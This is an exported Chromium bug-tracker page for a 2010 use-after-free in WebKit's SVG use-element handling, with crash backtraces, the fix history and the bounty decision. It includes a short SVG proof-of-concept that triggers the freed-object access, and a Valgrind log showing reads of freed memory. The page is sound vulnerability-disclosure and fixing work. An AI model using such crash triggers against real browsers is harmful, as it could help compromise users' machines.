# EXTERNAL-REPORT: SVGElementInstance::m_useElement not cleared on corresponding use element destruction

| Field | Value |
|-------|-------|
| **Issue ID** | [40086201](https://issues.chromium.org/issues/40086201) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | sc...@gmail.com |
| **Assignee** | js...@chromium.org |
| **Created** | 2010-12-17 |
| **Bounty** | $500.00 |

## Description

Reported anonymously, along with an assertion of exploitability.

**VULNERABILITY DETAILS**  

Run the attached test case with --single-process --js-flags="--expose\_gc"

**VERSION**  

Chrome Version: trunk, M8. M9  

Operating System: Ubuntu 10.04, 64-bit

**REPRODUCTION CASE**  

See attached.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

ASSERT(!m\_deletionHasBegun);  

#0 0x00000000020c3087 in WebCore::TreeShared[WebCore::ContainerNode](javascript:void(0);)::ref (  

this=0x7fffeb010808) at third\_party/WebKit/WebCore/platform/TreeShared.h:61  

#1 0x000000000232a91a in WebCore::V8SVGUseElement::wrapSlow (  

impl=0x7fffeb010800)  

at out/Debug/obj/gen/webcore/bindings/V8SVGUseElement.cpp:371  

#2 0x000000000229b889 in WebCore::V8SVGUseElement::wrap (impl=0x7fffeb010800,  

forceNewObject=false)  

at out/Debug/obj/gen/webkit/bindings/V8SVGUseElement.h:62  

#3 0x000000000229b8d2 in WebCore::toV8 (impl=0x7fffeb010800,  

forceNewObject=false)  

at out/Debug/obj/gen/webkit/bindings/V8SVGUseElement.h:69  

#4 0x000000000228650a in correspondingUseElementAttrGetter (name=...,  

info=...) at out/Debug/obj/gen/webcore/bindings/V8SVGElementInstance.cpp:63  

#5 0x000000000187b85f in v8::internal::Object::GetPropertyWithCallback (  

this=0x7fffb951b2f9, receiver=0x7fffb951b2f9, structure=0x7fffb95023d9,  

name=0x7fffb9549ec9, holder=0x7fffb951b2f9) at v8/src/objects.cc:184  

#6 0x000000000187c7a5 in v8::internal::Object::GetProperty (  

this=0x7fffb951b2f9, receiver=0x7fffb951b2f9, result=0x7fffe62673d0,  

name=0x7fffb9549ec9, attributes=0x7fffe62674d4) at v8/src/objects.cc:521  

#7 0x000000000183260b in v8::internal::LoadIC::Load (this=0x7fffe6267530,  

state=v8::internal::UNINITIALIZED, object=..., name=...)  

at v8/src/ic.cc:915  

#8 0x00000000018353ee in v8::internal::LoadIC\_Miss (args=...)  

...

## Attachments

- [poc_svg2_chrome.svg](attachments/poc_svg2_chrome.svg) (text/x-c++; charset=us-ascii, 1.7 KB)
- [testr.svg](attachments/testr.svg) (text/plain; charset=us-ascii, 630 B)

## Timeline

### js...@chromium.org (2010-12-18)

I haven't looked in a debugger but from tracing it in codesearch it looks like we should be nulling out SVGElementInstance::m_useElement when the corresponding SVGUseElement gets destroyed.

### js...@chromium.org (2010-12-22)

I think I have a fix. I just need to minimize the testcase and check all the locations where the fix could introduce null derefs.

### in...@chromium.org (2010-12-22)

Reduced testcase using minimizer, run inside debug with expose gc flags.

<svg onload="startup(evt)" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<script>
<![CDATA[
function startup(evt){
    var obj=document.getElementById("x").instanceRoot;
    document.getElementById("x").parentElement.removeChild(document.getElementById("x"));
    gc();
    obj.correspondingUseElement;
}
//]]>
</script>
<g id="sketchpad"></g>
    <defs>
        <pattern id="Pattern" patternUnits="userSpaceOnUse" viewBox="0 0 10 10">
        <use xlink:href="#sketchpad" transform=" scale(.12,.04) translate(-120,-60)" id="x" />
        </pattern>
    </defs>
<ellipse/>
</svg>

### js...@chromium.org (2010-12-22)

Reported upstream and patch up for review at: https://bugs.webkit.org/show_bug.cgi?id=51486

### js...@chromium.org (2010-12-24)

Landed upstream at: http://trac.webkit.org/changeset/74636

### js...@chromium.org (2010-12-28)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-12-29)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-01-04)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-01-04)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-01-04)

Merged to m8 as r75014. Will merge to m9 when it opens.

### sc...@gmail.com (2011-01-05)

The panel decided to reward this at the base $500 level; the PoC contains a bunch of extraneous constructs unrelated to the crash condition.
We'll let anonymous know of the reward offer.

### in...@chromium.org (2011-01-06)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-01-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-01-07)

Justin, can you please check this comment in the dup bug

-----
https://crbug.com/chromium/67363#c12 by miaubiz, Today (10 minutes ago)

hi,

I checked out the webkit git and built chrome with rev 70632 and I still get this with 14l.html and valgrind.  (The segfault is at 0x498 or 0x499.)

~/chromium/src % out/Debug/chrome --renderer-cmd-prefix='/home/user/chromium/src/tools/valgrind/valgrind.sh' ~/chrome/14l.html
Using valgrind binaries from /home/user/chromium/src/third_party/valgrind/linux_x64

[31442:31442:433363277499:WARNING:chrome_main.cc(313)] process type 'renderer' should go through the zygote.
[31414:31420:433371664213:WARNING:plugin_lib_posix.cc(113)] /usr/lib/flashplugin-installer/libflashplayer.so is nspluginwrapper wrapping a plugin for a different architecture; it will work better if you instead use a native plugin.
==31442== Invalid read of size 8
==31442==    at 0x2C8EEDE: WebCore::SVGFontFaceElement::horizontalOriginX() const (SVGFontFaceElement.cpp:140)
==31442==    by 0x2C89FE3: WebCore::SVGFontData::SVGFontData(WebCore::SVGFontFaceElement*) (SVGFontData.cpp:34)
==31442==    by 0x2C0DE3B: WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) (CSSFontFaceSource.cpp:171)
==31442==    by 0x2C0A9A6: WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) (CSSFontFace.cpp:112)
==31442==    by 0x2B635D3: WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) (CSSSegmentedFontFace.cpp:106)
==31442==    by 0x2B48FB4: WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) (CSSFontSelector.cpp:543)
==31442==    by 0x24704F7: WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) (FontCache.cpp:386)
==31442==    by 0x247BC5C: WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const (FontFallbackList.cpp:105)
==31442==    by 0x20F1A73: WebCore::FontFallbackList::primaryFontData(WebCore::Font const*) const (FontFallbackList.h:66)
==31442==    by 0x247BA82: WebCore::FontFallbackList::determinePitch(WebCore::Font const*) const (FontFallbackList.cpp:76)
==31442==    by 0x29C6DD0: WebCore::FontFallbackList::isFixedPitch(WebCore::Font const*) const (FontFallbackList.h:47)
==31442==    by 0x29C6E53: WebCore::Font::isFixedPitch() const (Font.h:277)
==31442==  Address 0x114c1c90 is 144 bytes inside a block of size 152 free'd
==31442==    at 0x698FEA6: free (vg_replace_malloc.c:913)
==31442==    by 0x2402530: WTF::fastFree(void*) (FastMalloc.cpp:327)
==31442==    by 0x20D8290: WTF::FastAllocBase::operator delete(void*) (FastAllocBase.h:121)
==31442==    by 0x2C9016D: WebCore::SVGFontFaceElement::~SVGFontFaceElement() (SVGFontFaceElement.h:34)
==31442==    by 0x26A3426: void WebCore::removeAllChildrenInContainer<WebCore::Node, WebCore::ContainerNode>(WebCore::ContainerNode*) (ContainerNodeAlgorithms.h:64)
==31442==    by 0x269E901: WebCore::ContainerNode::removeAllChildren() (ContainerNode.cpp:72)
==31442==    by 0x269EBA8: WebCore::ContainerNode::~ContainerNode() (ContainerNode.cpp:97)
==31442==    by 0x26EC1FB: WebCore::Element::~Element() (Element.cpp:80)
==31442==    by 0x274665A: WebCore::StyledElement::~StyledElement() (StyledElement.cpp:120)
==31442==    by 0x2C6A547: WebCore::SVGElement::~SVGElement() (SVGElement.cpp:84)
==31442==    by 0x2CC356C: WebCore::SVGStyledElement::~SVGStyledElement() (SVGStyledElement.cpp:68)
==31442==    by 0x2CA28DC: WebCore::SVGStyledLocatableElement::~SVGStyledLocatableElement() (SVGStyledLocatableElement.h:33)
==31442== 
==31442== 
==31442== ---- Attach to debugger ? --- [Return/N/n/Y/y/C/c] ---- n
==31442== Invalid read of size 8
==31442==    at 0x2C8EEF5: WebCore::SVGFontFaceElement::horizontalOriginX() const (SVGFontFaceElement.cpp:146)
==31442==    by 0x2C89FE3: WebCore::SVGFontData::SVGFontData(WebCore::SVGFontFaceElement*) (SVGFontData.cpp:34)
==31442==    by 0x2C0DE3B: WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) (CSSFontFaceSource.cpp:171)
==31442==    by 0x2C0A9A6: WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) (CSSFontFace.cpp:112)
==31442==    by 0x2B635D3: WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) (CSSSegmentedFontFace.cpp:106)
==31442==    by 0x2B48FB4: WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) (CSSFontSelector.cpp:543)
==31442==    by 0x24704F7: WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) (FontCache.cpp:386)
==31442==    by 0x247BC5C: WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const (FontFallbackList.cpp:105)
==31442==    by 0x20F1A73: WebCore::FontFallbackList::primaryFontData(WebCore::Font const*) const (FontFallbackList.h:66)
==31442==    by 0x247BA82: WebCore::FontFallbackList::determinePitch(WebCore::Font const*) const (FontFallbackList.cpp:76)
==31442==    by 0x29C6DD0: WebCore::FontFallbackList::isFixedPitch(WebCore::Font const*) const (FontFallbackList.h:47)
==31442==    by 0x29C6E53: WebCore::Font::isFixedPitch() const (Font.h:277)
==31442==  Address 0x114c1c90 is 144 bytes inside a block of size 152 free'd
==31442==    at 0x698FEA6: free (vg_replace_malloc.c:913)
==31442==    by 0x2402530: WTF::fastFree(void*) (FastMalloc.cpp:327)
==31442==    by 0x20D8290: WTF::FastAllocBase::operator delete(void*) (FastAllocBase.h:121)
==31442==    by 0x2C9016D: WebCore::SVGFontFaceElement::~SVGFontFaceElement() (SVGFontFaceElement.h:34)
==31442==    by 0x26A3426: void WebCore::removeAllChildrenInContainer<WebCore::Node, WebCore::ContainerNode>(WebCore::ContainerNode*) (ContainerNodeAlgorithms.h:64)
==31442==    by 0x269E901: WebCore::ContainerNode::removeAllChildren() (ContainerNode.cpp:72)
==31442==    by 0x269EBA8: WebCore::ContainerNode::~ContainerNode() (ContainerNode.cpp:97)
==31442==    by 0x26EC1FB: WebCore::Element::~Element() (Element.cpp:80)
==31442==    by 0x274665A: WebCore::StyledElement::~StyledElement() (StyledElement.cpp:120)
==31442==    by 0x2C6A547: WebCore::SVGElement::~SVGElement() (SVGElement.cpp:84)
==31442==    by 0x2CC356C: WebCore::SVGStyledElement::~SVGStyledElement() (SVGStyledElement.cpp:68)
==31442==    by 0x2CA28DC: WebCore::SVGStyledLocatableElement::~SVGStyledLocatableElement() (SVGStyledLocatableElement.h:33)
==31442== 
==31442== 
==31442== ---- Attach to debugger ? --- [Return/N/n/Y/y/C/c] ---- n
==31442== Invalid read of size 4
==31442==    at 0x20F0C35: WebCore::Node::getFlag(WebCore::Node::NodeFlags) const (Node.h:615)
==31442==    by 0x20F0C80: WebCore::Node::areSVGAttributesValid() const (Node.h:696)
==31442==    by 0x26ECEFD: WebCore::Element::getAttribute(WebCore::QualifiedName const&) const (Element.cpp:229)
==31442==    by 0x2C8EF0D: WebCore::SVGFontFaceElement::horizontalOriginX() const (SVGFontFaceElement.cpp:146)
==31442==    by 0x2C89FE3: WebCore::SVGFontData::SVGFontData(WebCore::SVGFontFaceElement*) (SVGFontData.cpp:34)
==31442==    by 0x2C0DE3B: WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) (CSSFontFaceSource.cpp:171)
==31442==    by 0x2C0A9A6: WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) (CSSFontFace.cpp:112)
==31442==    by 0x2B635D3: WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) (CSSSegmentedFontFace.cpp:106)
==31442==    by 0x2B48FB4: WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) (CSSFontSelector.cpp:543)
==31442==    by 0x24704F7: WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) (FontCache.cpp:386)
==31442==    by 0x247BC5C: WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const (FontFallbackList.cpp:105)
==31442==    by 0x20F1A73: WebCore::FontFallbackList::primaryFontData(WebCore::Font const*) const (FontFallbackList.h:66)
==31442==  Address 0x4141414141414191 is not stack'd, malloc'd or (recently) free'd
==31442== 
==31442== 
==31442== ---- Attach to debugger ? --- [Return/N/n/Y/y/C/c] ---- n
==31442== 
==31442== Process terminating with default action of signal 11 (SIGSEGV)
==31442==  General Protection Fault
==31442==    at 0x20F0C35: WebCore::Node::getFlag(WebCore::Node::NodeFlags) const (Node.h:615)
==31442==    by 0x20F0C80: WebCore::Node::areSVGAttributesValid() const (Node.h:696)
==31442==    by 0x26ECEFD: WebCore::Element::getAttribute(WebCore::QualifiedName const&) const (Element.cpp:229)
==31442==    by 0x2C8EF0D: WebCore::SVGFontFaceElement::horizontalOriginX() const (SVGFontFaceElement.cpp:146)
==31442==    by 0x2C89FE3: WebCore::SVGFontData::SVGFontData(WebCore::SVGFontFaceElement*) (SVGFontData.cpp:34)
==31442==    by 0x2C0DE3B: WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) (CSSFontFaceSource.cpp:171)
==31442==    by 0x2C0A9A6: WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) (CSSFontFace.cpp:112)
==31442==    by 0x2B635D3: WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) (CSSSegmentedFontFace.cpp:106)
==31442==    by 0x2B48FB4: WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) (CSSFontSelector.cpp:543)
==31442==    by 0x24704F7: WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) (FontCache.cpp:386)
==31442==    by 0x247BC5C: WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const (FontFallbackList.cpp:105)
==31442==    by 0x20F1A73: WebCore::FontFallbackList::primaryFontData(WebCore::Font const*) const (FontFallbackList.h:66)
==31442== 
==31442== ---- Attach to debugger ? --- [Return/N/n/Y/y/C/c] ---- n
==31442== 
==31442== HEAP SUMMARY:
==31442==     in use at exit: 1,152,893 bytes in 8,248 blocks
==31442==   total heap usage: 13,915 allocs, 5,667 frees, 3,017,882 bytes allocated
==31442== 
==31442== LEAK SUMMARY:
==31442==    definitely lost: 14,281 bytes in 15 blocks
==31442==    indirectly lost: 20,574 bytes in 419 blocks
==31442==      possibly lost: 136,572 bytes in 551 blocks
==31442==    still reachable: 154,603 bytes in 1,124 blocks
==31442==         suppressed: 826,863 bytes in 6,139 blocks
==31442== Rerun with --leak-check=full to see details of leaked memory
==31442== 
==31442== For counts of detected and suppressed errors, rerun with: -v
==31442== ERROR SUMMARY: 3 errors from 3 contexts (suppressed: 6 from 6)
/home/user/chromium/src/tools/valgrind/valgrind.sh: line 111: 31442 Killed                  G_SLICE=always-malloc NSS_DISABLE_ARENA_FREE_LIST=1 G_DEBUG=fatal_warnings GTEST_DEATH_TEST_USE_FORK=1 $RUN_COMMAND --trace-children=yes --suppressions="$SUPPRESSIONS" "${DEFAULT_TOOL_FLAGS[@]}" "$@"






### in...@chromium.org (2011-01-10)

merged to m9 in r75430

### js...@chromium.org (2011-01-12)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/67363?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086201)*
